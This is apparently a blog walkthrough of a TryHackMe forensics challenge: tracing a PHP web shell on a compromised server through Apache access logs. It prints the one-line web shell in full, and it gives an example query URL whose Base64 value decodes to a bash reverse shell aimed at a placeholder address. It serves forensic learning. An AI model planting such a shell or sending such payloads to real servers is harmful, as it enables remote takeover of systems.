---
title: "Challenges: Infinity Shell (TryHackMe)"
datePublished: Sun Jul 27 2025 15:35:16 GMT+0000 (Coordinated Universal Time)
cuid: cmdlubym8000h02js1h3hhk8p
slug: challenges-infinity-shell-tryhackme
cover: https://cdn.hashnode.com/res/hashnode/image/upload/v1753630459134/05f4daaa-67ed-44b6-99ff-7fd633785e43.png
tags: forensics, tryhackme, websecurity, ctf-writeup

---

The *Infinity Shell* forensics challenge focuses on investigating a compromised web server that had been exploited by attackers. Instead of the usual network scans and web enumeration, the challenge requires digging into the server's file structure and log files to trace attacker activity. The attackers had uploaded a PHP-based web shell capable of executing Base64-encoded commands, and the task is to reconstruct how it was used and ultimately extract the flag from their activity.

### **Set up your virtual environment**

To successfully complete this room, you'll need to set up your virtual environment. This involves starting the Target Machine, ensuring you're equipped with the necessary tools and access to tackle the challenges ahead.

![Character Image](https://tryhackme-images.s3.amazonaws.com/user-uploads/62ff64c3c859dc0042b2b9f6/room-content/62ff64c3c859dc0042b2b9f6-1742203659614.png align="left")

Cipher’s legion of bots has exploited a known vulnerability in our web application, leaving behind a dangerous web shell implant. Investigate the breach and trace the attacker's footsteps!

Note: Click the **Start Machine** button to spawn the Virtual Machine.

## Answer the questions below

What is the flag?

Tried doing basic enumeration using tools like `nmap`, `gobuster` and visiting the site but none of it was a success. Got a 405 on the site which I concluded that maybe they didn’t anticipate for us to use these tools or access the site that much.

Later looked for hints on other walkthroughs and learned that there’s a CMS site that’s within the `/var/www/html`.

![](https://cdn.hashnode.com/res/hashnode/image/upload/v1753628625912/25c81984-6c27-4a0c-a196-f9eb945b3995.png align="center")

![](https://cdn.hashnode.com/res/hashnode/image/upload/v1753629804218/7057eca4-da54-441c-8167-035b9813d5c2.png align="center")

the CMS has an img folder that has a images.php file which

```python
<?php system(base64_decode($_GET['query'])); ?>
```

## Understanding how the PHP Web Shell Executes Base64-Encoded Commands

Had to ask ChatGPT what this code does since I’m still learning and learn how we ended up getting the base64 hash in the logs that helped us get the flag

### **What does this PHP code do?**

```python
<?php system(base64_decode($_GET['query'])); ?>
```

* `$_GET['query']` → takes a value from the **query string** (like `?query=abc123`)
    
* `base64_decode()` → decodes that value from **Base64**
    
* `system()` → executes the decoded value as an **OS command**
    

---

### **Why look in** `/var/log`?

1. **Web servers log every request.**  
    Apache or Nginx keeps logs (usually in `/var/log/apache2/access.log` or `/var/log/nginx/access.log`).
    
2. The attacker would need to trigger this file with something like:
    
    ```python
    http://<server>/CMSsite-master/img/images.php?query=YmFzaCAtaSA+JiAvZGV2L3RjcC94eC54eC54eC54eDo4MDgwID4mMQ==
    ```
    
    That Base64 payload gets recorded in the **access logs** because the **URL (including query parameters) is always logged** by default.
    
3. **Hence, forensic logic:**
    
    * Look at how attackers interacted with the web shell → **access logs**
        
    * Extract the `query` parameter from logs → it's Base64 encoded → decode it → find out what commands they executed.
        

---

### **So the hint came from:**

* **The code itself** tells us how attackers interacted:
    
    * Only one entry point: `images.php?query=...`
        
    * Payloads must be **Base64**
        
* **In real-world forensic thinking:**
    
    * If an RCE was discovered, logs are your timeline of attacker activity.
        

### logs

Had to check the `/var/log/apache` for the logs files for the site

![](https://cdn.hashnode.com/res/hashnode/image/upload/v1753629524230/a629148e-a4d0-4092-916b-ed4596d7a077.png align="center")

I used the `cat other_vhosts_access.log.1` and had to scroll a lot before I found the Base64 query hash. If you’ll be following this you can use either of these commands instead  
  
`cat other_vhosts_access.log.1 | grep "images.php"`  

`grep "images.php" other_vhosts_access.log.1`

![](https://cdn.hashnode.com/res/hashnode/image/upload/v1753629480616/2f1ce69e-7ac9-4b7b-a261-6ca42b1dfbdf.png align="center")

![](https://cdn.hashnode.com/res/hashnode/image/upload/v1753629711222/d4c5e115-e3e6-41e3-aab3-d0e37dbbe092.png align="center")

I used [Base64Decode](https://www.base64decode.org/) site to decode the base64 hash

![](https://cdn.hashnode.com/res/hashnode/image/upload/v1753629761730/1156b337-2357-4418-95d6-0b2b79dc4604.png align="center")

This challenge was a valuable exercise in understanding how attackers leverage simple PHP web shells and how their activity can still be traced through web server logs. By identifying the malicious `images.php` file, understanding its behavior, and reviewing Apache access logs, we could reconstruct the commands executed by the attacker. This reinforces an important forensic principle: even when attackers attempt to hide their actions, server logs often provide the evidence needed to uncover their activities.